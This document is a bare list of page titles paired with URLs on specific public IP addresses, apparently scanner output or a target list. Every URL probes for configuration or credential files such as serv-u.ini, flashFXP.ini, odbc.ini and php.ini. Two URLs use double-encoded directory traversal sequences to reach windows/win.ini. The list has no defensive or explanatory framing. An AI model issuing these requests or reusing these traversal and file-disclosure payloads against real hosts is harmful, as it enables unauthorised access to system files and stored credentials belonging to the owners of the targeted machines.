EXTRANET,http://210.242.148.142/login/components/com_simpleboard/modules/My_eGallery/editor/2082/serv-u.ini
Cisco,http://210-242-146-178.hinet-ip.hinet.net/comments/m2f/..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252fwindows/win.ini
Gateway Configuration Menu,http://175.96.48.168/login/webmail./axis-cgi/m2f/ventrilo_srv.ini
PHProjekt,http://210.200.17.128/login/ovcgi/impex/flashFXP.ini
Supero Doctor III,http://61.67.24.137/Login/textpattern/preferences.ini
MX - ADSL Configuration page,http://210.202.233.137/login/.br/m2f/inc/cmses/serv-u.ini
TOPdesk ApplicationServer,http://210.202.233.190/comments/2082/odbc.ini
EverFocus.EDSR.app<-b>let,http://137.74.255.20:84/login.cfm/cgi-bin/include/odbc.ini
System Statistics,http://210.242.149.143/login/8003/lib/php.ini
Big,http://210.63.253.166/login1/mail/%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cwindows/win.ini
